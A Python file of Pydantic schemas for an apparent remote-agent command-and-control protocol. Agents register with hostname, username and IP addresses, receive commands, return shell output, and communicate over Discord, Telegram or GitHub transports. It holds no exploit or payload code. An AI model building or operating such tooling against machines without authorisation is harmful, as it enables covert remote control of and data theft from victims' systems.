"""
KAAL Protocol Models — Pydantic validation for all V4 messages.
"""
from enum import Enum
from typing import Optional, Dict, Any, List
from pydantic import BaseModel, Field
from datetime import datetime


# ───────────────────── Enums ─────────────────────

class MessageType(str, Enum):
    REGISTER    = "register"
    HEARTBEAT   = "heartbeat"
    RESULT      = "result"
    ACK         = "ack"
    STATUS      = "status"
    CHUNK       = "chunk"
    SHELL_OUTPUT = "shell_output"
    LOG         = "log"
    COMMAND     = "command"
    CONTROL     = "control"
    CONFIG      = "config"
    STREAM_DATA = "stream_data"
    STREAM_END  = "stream_end"


class TaskStatus(str, Enum):
    PENDING   = "pending"
    SENT      = "sent"
    ACKED     = "acked"
    COMPLETED = "completed"
    FAILED    = "failed"


class TransportType(str, Enum):
    DISCORD  = "discord"
    TELEGRAM = "telegram"
    GITHUB   = "github"
    DIRECT   = "direct"


# ───────────────────── Protocol Envelope ─────────────────────

class MessageFlags(BaseModel):
    ack_required: bool = False
    priority: int = 0
    retry: int = 0
    control: bool = False
    compression: Optional[str] = None
    encryption: Optional[str] = None
    ttl: Optional[int] = None


class AgentEnvelope(BaseModel):
    """V4 Protocol envelope — wraps all agent↔server messages."""
    version: str = "1.0"
    type: str
    agent_id: str
    timestamp: Optional[str] = None
    seq: Optional[int] = None
    flags: Optional[MessageFlags] = None
    payload: Optional[Dict[str, Any]] = None

    class Config:
        extra = "allow"  # Allow extra fields for backward compat


# ───────────────────── Payloads ─────────────────────

class RegisterPayload(BaseModel):
    platform: str = "unknown"
    hostname: str = "unknown"
    username: str = "unknown"
    internal_ip: str = "0.0.0.0"
    public_ip: Optional[str] = None
    capabilities: List[str] = []
    transport: Optional[str] = None


class HeartbeatPayload(BaseModel):
    uptime: Optional[int] = None
    idle_time: Optional[int] = None


class ResultPayload(BaseModel):
    task_id: Optional[str] = None
    result: Optional[Any] = None


class TaskPayload(BaseModel):
    task_id: str
    command: str


# ───────────────────── API Models ─────────────────────

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    parameters: Optional[Dict[str, Any]] = None


class BulkDeleteRequest(BaseModel):
    agent_ids: List[str]


class AgentRecord(BaseModel):
    """Represents a stored agent in the database."""
    id: str
    platform: str = "unknown"
    hostname: str = "unknown"
    username: str = "unknown"
    internal_ip: str = "0.0.0.0"
    public_ip: Optional[str] = None
    first_seen: str = ""
    last_seen: str = ""
    status: str = "active"
    connection_type: str = "direct"
    transport_type: str = "discord"
    transport_id: Optional[str] = None  # per-agent Discord channel ID
    capabilities: str = "[]"  # JSON string of capability list


class TaskRecord(BaseModel):
    """Represents a stored task in the database."""
    id: str
    agent_id: str
    command: str = ""
    parameters: str = "{}"  # JSON string
    status: str = TaskStatus.PENDING
    created_at: str = ""
    sent_at: Optional[str] = None
    completed_at: Optional[str] = None
    result: Optional[str] = None  # JSON string
    error: Optional[str] = None
